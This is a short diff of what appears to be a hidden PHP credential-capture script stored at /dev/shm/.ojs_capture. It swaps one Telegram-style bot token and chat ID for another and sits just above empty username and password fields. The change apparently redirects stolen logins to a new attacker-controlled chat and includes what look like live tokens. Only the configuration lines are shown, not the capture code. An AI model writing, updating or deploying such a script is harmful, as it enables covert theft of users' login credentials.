@@ -4,8 +4,8 @@
  * File: /dev/shm/.ojs_capture
  */
 
-$bot_token = '8881094788:AAG8OLVvIRa-ICIRRj-0maqrpLnhxiemQus';
-$chat_id = '8881094788';
+$bot_token = '8215328882:AAHrsFUWuTRCXN8-cNMo9lxGion_HeZhWAc';
+$chat_id = '8307627274';
 
 $username = '';
 $password = '';
